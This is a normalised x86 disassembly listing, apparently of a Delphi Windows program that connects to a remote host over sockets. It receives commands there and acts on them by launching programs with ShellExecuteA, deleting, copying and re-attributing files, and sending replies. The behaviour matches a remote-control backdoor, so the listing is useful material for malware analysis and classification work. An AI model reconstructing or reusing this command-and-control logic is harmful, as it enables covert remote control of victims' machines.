mov ecx 0x11
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x76c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_475aa8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_475a5c
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_475af4
mov edx [ ebp - 0x18 ]
mov eax ebx
call sub_475b40
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_475a10
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_475b8c
mov eax ebx
call sub_41fef0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x11
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
xor edx edx
mov eax ebx
call sub_484ee8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_484f08
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_484f74
mov eax ebx
call sub_41fef0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_47eaec
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_47ecf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x1c ]
call sub_48bf2c
push [ ebp - 0x1c ]
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_409b7c
push [ ebp - 0x20 ]
mov eax [ rw-data ]
mov edx 0x3
call sub_4058e0
mov eax [ rw-data ]
mov [ eax ] 0x0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] 0x1
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx r-xdata
mov edx r-xdata
call sub_40ef44
mov edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405584
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_48bf54
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_405584
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call CreateThread
mov eax [ rw-data ]
mov [ eax ] 0x1
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
jmp r-xdata
call sub_40bc98
fstp [ ebp - 0x10 ]
fwait
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x4 ]
call sub_40c8f8
call sub_40bcc4
fstp [ ebp - 0x18 ]
fwait
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
call sub_40c8f8
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax [ rw-data ]
mov edx 0x3
call sub_4058e0
push 0x0
push 0x0
push 0x0
push esi
call GetMessageA
test eax eax
jne r-xdata
push esi
call TranslateMessage
push esi
call DispatchMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ecf7
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_47edc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc dh ch
add [ eax ] al
push cs
push esp
push ecx
jne r-xdata
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ ecx + edi * 8 + 0x47 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec esp
add [ eax ] al
add [ esi ] cl
push eax
push r-xdata
push 0x0
arpl [ ebx + 0x54 ] bp
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f105
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
imul edi eax 0xffffffff
outsb
jae r-xdata
call ShellExecuteA
jmp r-xdata
add [ edx ] ch
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
out dx al
inc edi
add [ eax ] bl
add [ eax ] al
clc
jg r-xdata
add [ eax ] dl
out dx al
inc eax
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47f0fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4c ]
call sub_48a13c
cmp edx [ ebx + 0x54 ]
jne r-xdata
jl r-xdata
cmp eax [ ebx + 0x50 ]
jae r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebx + 0x40 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x5
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebx + 0x40 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x40 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
xor eax eax
call sub_475bd8
jmp r-xdata
push 0x5
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x80
lea eax [ ebp - 0xc ]
call sub_489c78
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x10 ]
call sub_489c78
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405818
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] esi
mov eax [ ebp - 0x14 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
push 0x0
lea eax [ ebp - 0x18 ]
call sub_489c78
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x18 ]
call sub_4059dc
push eax
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
call CopyFileA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x1
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
call PlaySoundA
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
push 0x0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0x20 ]
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_4735e8
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x1c ]
call sub_4059dc
push eax
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
call CopyFileA
sub_47ee3c
push ebp
mov ebp esp
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47f0fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4c ]
call sub_48a13c
cmp edx [ ebx + 0x54 ]
jne r-xdata
jl r-xdata
cmp eax [ ebx + 0x50 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f105
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x5
mov edx 0x1
mov eax [ ebx + 0x40 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x5
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebx + 0x40 ]
mov ecx 0x5
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x40 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
xor eax eax
call sub_475bd8
jmp r-xdata
push 0x5
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x80
lea eax [ ebp - 0xc ]
call sub_489c78
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call SetFileAttributesA
lea eax [ ebp - 0x10 ]
call sub_489c78
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405818
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] esi
mov eax [ ebp - 0x14 ]
call sub_4059dc
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
push 0x0
lea eax [ ebp - 0x18 ]
call sub_489c78
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x18 ]
call sub_4059dc
push eax
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
call CopyFileA
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x1
push 0x0
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
call PlaySoundA
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
push 0x0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0x20 ]
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_4735e8
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x1c ]
call sub_4059dc
push eax
mov eax [ ebx + 0x4c ]
call sub_4059dc
push eax
call CopyFileA
sub_47f1d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47f42b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f432
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x40 ]
call sub_4055c8
lea eax [ ebp - 0x4 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47f40e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b734
mov eax [ ebp - 0xc ]
call sub_41beb4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_467850
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_465a0c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
call sub_465a0c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465df8
mov esi eax
mov eax [ rw-data ]
mov [ eax ] esi
mov eax [ rw-data ]
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40f944
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465df8
mov edx [ rw-data ]
mov [ edx ] eax
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465df8
mov edx [ rw-data ]
mov [ edx ] eax
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465df8
mov edx [ rw-data ]
mov [ edx ] eax
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465df8
mov edx [ rw-data ]
mov [ edx ] eax
mov edx r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_465df8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
lea eax [ ebp - 0x8 ]
call sub_40f944
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_47f4c0
push ebp
mov ebp esp
push 0x0
push 0x1
mov eax [ rw-data ]
call j_sub_4059f0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call send
pop ebp
retn
sub_47f4e0
push ebp
mov ebp esp
mov ecx 0x433
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47f930
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x2174 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov ecx 0x6
mov edx 0x1
call sub_405a44
mov eax [ ebp - 0x2174 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f937
lea eax [ ebp - 0x2198 ]
call sub_405530
lea eax [ ebp - 0x2194 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x218c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x2184 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x217c ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov [ ebp - 0x2170 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x216e ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov esi eax
mov [ ebp - 0x216c ] esi
inc esi
jne r-xdata
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
push 0x10
lea eax [ ebp - 0x2170 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x2011 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
push r-xdata
lea edx [ ebp - 0x217c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x48 ]
call sub_409d70
push [ ebp - 0x217c ]
push r-xdata
mov eax [ ebp - 0xc ]
push [ eax + 0x4c ]
push r-xdata
mov eax [ ebp - 0xc ]
push [ eax + 0x40 ]
lea eax [ ebp - 0x2178 ]
mov edx 0x6
call sub_4058e0
mov edx [ ebp - 0x2178 ]
mov eax [ ebp - 0x4 ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x2011 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x216c ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_47f1d4
test bl bl
je r-xdata
lea eax [ ebp - 0x2011 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2011 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
lea eax [ ebp - 0x2184 ]
lea edx [ ebp - 0x2011 ]
call sub_405e3c
mov eax [ ebp - 0x2184 ]
lea edx [ ebp - 0x2180 ]
call sub_409bd0
mov edx [ ebp - 0x2180 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
mov eax [ ebp - 0x8 ]
call sub_409edc
cdq
mov ecx [ ebp - 0xc ]
mov [ ecx + 0x50 ] eax
mov [ ecx + 0x54 ] edx
push ebp
call sub_47f4c0
pop ecx
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_47ee3c
jmp r-xdata
lea eax [ ebp - 0x2160 ]
call sub_403918
call sub_40305c
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push j_sub_404b30#4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x2188 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4c ]
call sub_40a68c
mov eax [ ebp - 0x2188 ]
push eax
lea edx [ ebp - 0x218c ]
mov eax 0x1a
call sub_48adcc
mov edx [ ebp - 0x218c ]
mov eax [ ebp - 0xc ]
add eax 0x4c
pop ecx
call sub_405864
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4c ]
lea eax [ ebp - 0x2160 ]
call sub_403770
mov eax [ rw-data ]
mov [ eax ] 0x1
mov edx 0x1
lea eax [ ebp - 0x2160 ]
call sub_403e84
call sub_40305c
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
mov eax [ ebp - 0xc ]
call sub_41ff18
mov eax [ ebp - 0xc ]
cmp [ eax + 0xd ] 0x0
je r-xdata
test bl bl
je r-xdata
lea eax [ ebp - 0x2011 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2011 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
mov esi eax
test esi esi
jle r-xdata
jmp r-xdata
lea edx [ ebp - 0x2011 ]
mov ecx esi
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0x10 ]
push ebp
call sub_47f4c0
pop ecx
mov eax [ ebp - 0xc ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x2011 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2011 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
mov esi eax
test esi esi
jle r-xdata
jmp r-xdata
lea eax [ ebp - 0x2194 ]
lea edx [ ebp - 0x2011 ]
call sub_405e3c
mov eax [ ebp - 0x2194 ]
lea edx [ ebp - 0x2190 ]
call sub_409bd0
mov edx [ ebp - 0x2190 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
lea eax [ ebp - 0x2198 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2198 ]
mov edx r-xdata
call sub_405974
je r-xdata
push 0x0
lea edx [ ebp - 0x2011 ]
mov ecx esi
lea eax [ ebp - 0x2160 ]
call sub_4038f8
call sub_40305c
push ebp
call sub_47f4c0
pop ecx
sub_47f74e
xor ebx ebx
call sub_404f40
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_47f1d4
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
call sub_47ee3c
jmp r-xdata
lea eax [ ebp - 0x2160 ]
call sub_403918
call sub_40305c
lea eax [ ebp - 0x2011 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
push 0x0
push 0x2000
lea eax [ ebp - 0x2011 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
mov esi eax
test esi esi
jle r-xdata
jmp r-xdata
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
mov eax [ ebp - 0xc ]
call sub_41ff18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f937
lea eax [ ebp - 0x2198 ]
call sub_405530
lea eax [ ebp - 0x2194 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x218c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x2184 ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x217c ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x8 ]
call sub_405530
retn
lea eax [ ebp - 0x2194 ]
lea edx [ ebp - 0x2011 ]
call sub_405e3c
mov eax [ ebp - 0x2194 ]
lea edx [ ebp - 0x2190 ]
call sub_409bd0
mov edx [ ebp - 0x2190 ]
lea eax [ ebp - 0x8 ]
call sub_4057d4
lea eax [ ebp - 0x2198 ]
push eax
mov ecx 0x7
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x2198 ]
mov edx r-xdata
call sub_405974
je r-xdata
push 0x0
lea edx [ ebp - 0x2011 ]
mov ecx esi
lea eax [ ebp - 0x2160 ]
call sub_4038f8
call sub_40305c
push ebp
call sub_47f4c0
pop ecx
sub_47f988
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_47f9c9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
